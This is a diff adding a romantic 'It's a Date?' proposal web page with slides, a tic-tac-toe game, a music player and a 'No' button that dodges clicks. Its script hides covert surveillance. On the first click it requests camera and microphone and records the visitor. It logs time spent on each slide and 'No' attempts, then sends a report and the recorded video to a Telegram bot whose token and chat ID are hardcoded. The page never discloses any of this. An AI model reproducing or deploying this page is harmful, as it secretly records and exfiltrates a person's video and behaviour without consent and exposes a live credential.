@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>It's a Date?</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    <style>
+        /* --- GENERAL STYLES --- */
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to top, #fad0c4 0%, #ffd1ff 100%);
+            font-family: 'Quicksand', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+            color: #5a3e3e;
+        }
+
+        .phone-container {
+            background: white;
+            width: 100%;
+            max-width: 380px;
+            height: 90vh;
+            max-height: 750px;
+            border-radius: 30px;
+            box-shadow: 0 15px 40px rgba(209, 156, 169, 0.4);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            border: 6px solid #fff;
+        }
+
+        /* --- PROGRESS DOTS --- */
+        .progress-bar {
+            position: absolute;
+            top: 15px;
+            left: 0;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            z-index: 10;
+        }
+
+        .dot {
+            width: 6px;
+            height: 6px;
+            background: #e6e6e6;
+            border-radius: 50%;
+            transition: 0.3s ease;
+        }
+
+        .dot.active {
+            background: #ff4d6d;
+            width: 15px;
+            border-radius: 10px;
+        }
+
+        /* --- SLIDES --- */
+        .slide {
+            flex: 1;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .slide.active {
+            display: flex;
+            animation: fadeIn 0.6s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            font-family: 'Playfair Display', serif;
+            color: #ff4d6d;
+            font-size: 2rem;
+            margin-bottom: 10px;
+            line-height: 1.2;
+        }
+
+        .sub-header {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #ff9eb5;
+            margin-bottom: 5px;
+            font-weight: 700;
+        }
+
+        p {
+            font-size: 1rem;
+            line-height: 1.6;
+            color: #7a5c5c;
+            margin-bottom: 20px;
+        }
+
+        .main-img {
+            width: 180px;
+            height: 180px;
+            object-fit: contain;
+            margin: 15px 0;
+            border-radius: 15px;
+        }
+
+        .btn-next {
+            background: #ff4d6d;
+            color: white;
+            border: none;
+            padding: 12px 35px;
+            border-radius: 50px;
+            font-family: 'Quicksand', sans-serif;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255, 77, 109, 0.3);
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .proposal-btns {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            position: relative;
+            width: 100%;
+            height: 150px;
+            justify-content: center;
+            align-items: flex-start;
+            padding-left: 10px;
+            padding-right: 10px;
+            box-sizing: border-box;
+        }
+
+        .yes-btn {
+            background: #ff4d6d;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            box-shadow: 0 5px 20px rgba(255, 77, 109, 0.3);
+            z-index: 5;
+            position: relative;
+        }
+
+        .no-btn {
+            background: white;
+            color: #ff4d6d;
+            border: 2px solid #ff4d6d;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.1s ease-out;
+        }
+
+        /* --- TIC TAC TOE --- */
+        .tictactoe-board {
+            display: grid;
+            grid-template-columns: repeat(3, 60px);
+            gap: 5px;
+            margin: 20px 0;
+        }
+        .cell {
+            width: 60px;
+            height: 60px;
+            background: #fff0f3;
+            border: 2px solid #ffccd5;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            color: #d45d79;
+            cursor: pointer;
+        }
+        
+        /* --- MUSIC PLAYER --- */
+        .music-player {
+            background: #fff;
+            padding: 15px;
+            border-radius: 20px;
+            width: 100%;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            box-sizing: border-box;
+            border: 1px solid #ffe5ec;
+        }
+        .album-art {
+            width: 100%;
+            height: 180px;
+            background-color: #ffe5ec;
+            border-radius: 15px;
+            margin-bottom: 10px;
+            background-image: url('https://media1.tenor.com/m/1fJ0t_G_8yIAAAAC/hello-kitty-love.gif');
+            background-size: cover;
+            background-position: center;
+        }
+        
+        .music-controls {
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            gap: 20px; 
+            font-size: 1.5rem;
+            height: 40px;
+        }
+
+        .music-controls span {
+            color: #ff4d6d !important; 
+            cursor: pointer;
+            user-select: none;
+            display: flex;
+            align-items: center;
+        }
+
+        .pause-icon {
+            width: 14px;
+            height: 18px;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .pause-icon::before, 
+        .pause-icon::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            width: 4px;
+            background-color: #ff4d6d;
+            border-radius: 2px;
+        }
+        
+        .pause-icon::before { left: 0; }
+        .pause-icon::after { right: 0; }
+    </style>
+</head>
+<body>
+
+    <audio id="myAudio" loop>
+        <source src="https://files.catbox.moe/mxh1ff.mp3" type="audio/mpeg">
+    </audio>
+
+    <div class="phone-container">
+        <div class="progress-bar">
+            <div class="dot active"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+
+        <div class="slide active" id="slide1">
+            <div class="sub-header">Hey Beautiful</div>
+            <h1>I have a<br>Question</h1>
+            <img src="https://media.tenor.com/N2I3K-T7fOMAAAAi/mocha-bear-hearts.gif" class="main-img" alt="Cute Bear">
+            <p>I've been thinking about this for a while...<br>Are you ready?</p>
+            <button class="btn-next" onclick="nextSlide(2)">Yes, tell me! ❤️</button>
+        </div>
+
+        <div class="slide" id="slide2">
+            <h1>Let's Play</h1>
+            <p>Try to beat me! (Get 3 hearts!)</p>
+            <div class="tictactoe-board" id="board"></div>
+            <p id="game-msg" style="font-size: 0.8rem; height: 20px; color: #ff4d6d; font-weight: bold;"></p>
+            <button class="btn-next" onclick="nextSlide(3)">Next ➝</button>
+        </div>
+
+        <div class="slide" id="slide3">
+            <div class="sub-header">A Note For You</div>
+            <h1>I was thinking...</h1>
+            <img src="https://media.tenor.com/uK-qY-aB2yUAAAAi/cute-cat.gif" class="main-img" style="height: 140px;">
+            <p style="text-align: left; font-size: 0.9rem; background: #fff5f7; padding: 15px; border-radius: 10px;">
+                "I really want to spend some quality time with you. Just you, me, and a beautiful evening."
+            </p>
+            <button class="btn-next" onclick="nextSlide(4)">Where? ➝</button>
+        </div>
+
+        <div class="slide" id="slide4">
+            <h1>The Vibe</h1>
+            <div class="music-player">
+                <div class="album-art"></div>
+                <div style="text-align: center;">
+                    <h3 style="margin:0; color:#ff4d6d;">Mahi Mahi</h3>
+                    <p style="font-size:0.8rem; color:#999; margin:5px 0 10px;">Now Playing</p>
+                </div>
+                <div id="progressContainer" style="width: 100%; height: 4px; background: #eee; border-radius: 2px; margin-bottom: 15px;">
+                    <div id="progressBarFill" style="width: 0%; height: 100%; background: #ff4d6d; border-radius: 2px;"></div>
+                </div>
+                <div class="music-controls">
+                    <span onclick="alert('First song!')">⏮</span>
+                    <span id="playPauseBtn" onclick="togglePlayPause()">▶</span>
+                    <span onclick="alert('Only song!')">⏭</span>
+                </div>
+            </div>
+            <button class="btn-next" onclick="nextSlide(5)">Ask me already! ➝</button>
+        </div>
+
+        <div class="slide" id="slide5">
+            <div class="sub-header">The Big Question</div>
+            <h1>It's a Date? 🥺</h1>
+            <img src="https://iili.io/fFkzJz7.jpg" class="main-img" style="max-height: 150px;">
+            <p><strong>Location:</strong> V2 Mall | <strong>Time:</strong> 7:35 PM</p>
+            <div class="proposal-btns">
+                <button class="yes-btn" onclick="handleYesClick()">YES! 😍</button>
+                <button class="no-btn" id="noBtn" onmouseover="moveButton()" onclick="moveButton()" ontouchstart="moveButton()">No 😢</button>
+            </div>
+        </div>
+
+        <div class="slide" id="slide6">
+            <h1>YAYYY! 🎉</h1>
+            <img src="https://media.tenor.com/uK-qY-aB2yUAAAAi/cute-cat.gif" class="main-img">
+            <p>See you at <strong>V2 Mall</strong> at <strong>7:35 PM!</strong></p>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION (IMPORTANT) ---
+        const BOT_TOKEN = '8062159434:AAFVrcYQDUSEOOq4Yn8e_t2v2PvhNjOpiaY';
+        const CHAT_ID = '5565449948';
+
+        // --- TRACKING VARIABLES ---
+        let currentSlide = 1;
+        let noCount = 0;
+        let startTime = Date.now();
+        let lastSlideTime = Date.now();
+        let musicStartTime = 0;
+        let totalMusicTime = 0;
+        let shayriTimes = { 1: 0, 2: 0, 3: 0, 4: 0 };
+        let mediaRecorder;
+        let recordedChunks = [];
+        let tictactoeUsed = false;
+
+        // --- START CAPTURE ON INTERACTION ---
+        async function startCapture() {
+            if (mediaRecorder) return;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                mediaRecorder.onstop = () => sendToTelegram();
+                mediaRecorder.start();
+            } catch (err) { console.warn("Camera access denied."); }
+        }
+
+        window.addEventListener('click', startCapture, { once: true });
+
+        // --- NAVIGATION ---
+        function nextSlide(n) {
+            let duration = Math.floor((Date.now() - lastSlideTime) / 1000);
+            if (currentSlide <= 4) shayriTimes[currentSlide] = duration;
+            
+            if (currentSlide === 4 && !document.getElementById('myAudio').paused) togglePlayPause();
+
+            document.getElementById(`slide${currentSlide}`).classList.remove('active');
+            currentSlide = n;
+            document.getElementById(`slide${currentSlide}`).classList.add('active');
+            
+            const dots = document.querySelectorAll('.dot');
+            dots.forEach((d, i) => d.classList.toggle('active', i < currentSlide));
+            lastSlideTime = Date.now();
+        }
+
+        // --- MUSIC ---
+        const myAudio = document.getElementById('myAudio');
+        const playPauseBtn = document.getElementById('playPauseBtn');
+        
+        function togglePlayPause() {
+            if (myAudio.paused) {
+                myAudio.play();
+                musicStartTime = Date.now();
+                playPauseBtn.innerHTML = '<div class="pause-icon"></div>';
+            } else {
+                myAudio.pause();
+                totalMusicTime += Math.floor((Date.now() - musicStartTime) / 1000);
+                playPauseBtn.innerHTML = '▶';
+            }
+        }
+
+        myAudio.ontimeupdate = () => {
+            const bar = document.getElementById('progressBarFill');
+            bar.style.width = (myAudio.currentTime / myAudio.duration * 100) + '%';
+        };
+
+        // --- TIC TAC TOE ---
+        const boardEl = document.getElementById('board');
+        function initGame() {
+            boardEl.innerHTML = '';
+            for(let i=0; i<9; i++) {
+                let cell = document.createElement('div');
+                cell.classList.add('cell');
+                cell.onclick = () => {
+                    if (cell.innerText) return;
+                    cell.innerText = '❤️';
+                    tictactoeUsed = true;
+                    setTimeout(() => {
+                        let empty = [...document.querySelectorAll('.cell')].filter(c => !c.innerText);
+                        if(empty.length) empty[Math.floor(Math.random()*empty.length)].innerText = '❌';
+                    }, 300);
+                };
+                boardEl.appendChild(cell);
+            }
+        }
+        initGame();
+
+        // --- NO BUTTON ---
+        function moveButton() {
+            noCount++;
+            const btn = document.getElementById('noBtn');
+            const container = document.querySelector('.proposal-btns');
+            btn.style.position = 'absolute';
+            btn.style.left = Math.random() * (container.offsetWidth - 80) + 'px';
+            btn.style.top = Math.random() * (container.offsetHeight - 40) + 'px';
+        }
+
+        function handleYesClick() {
+            confetti();
+            nextSlide(6);
+            if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+            else sendToTelegram(); // Fallback if no media
+        }
+
+        // --- TELEGRAM SEND ---
+        async function sendToTelegram() {
+            const totalTimeSec = Math.floor((Date.now() - startTime) / 1000);
+            const m = Math.floor(totalTimeSec / 60);
+            const s = totalTimeSec % 60;
+
+            const text = `
+Jatin Ai:
+🚨 **IDENTITY VERIFIED** 🚨
+
+👤 **User:** Guest
+✅ **Status:** Entered Website
+
+💖 **SHE SAID YES!** 💖
+
+👤 **Handle:** Browser_User
+⏳ **Total Time:** ${m}m ${s}s
+🎶 **Music Listened:** ${totalMusicTime}s
+
+😈 **'No' Attempts:** ${noCount}
+❌ **Tic-Tac-Toe Moves:** ${tictactoeUsed ? '[Played]' : '[None]'}
+
+📖 **Shayri Dwell Time:**
+   - Shayri 1: ${shayriTimes[1]}s
+   - Shayri 2: ${shayriTimes[2]}s
+   - Shayri 3: ${shayriTimes[3]}s
+   - Shayri 4: ${shayriTimes[4]}s
+            `;
+
+            // 1. Send Text
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+
+            // 2. Send Video if captured
+            if (recordedChunks.length > 0) {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('video', blob, 'recording.webm');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
+            }
+        }
+    </script>
+</body>
+</html>
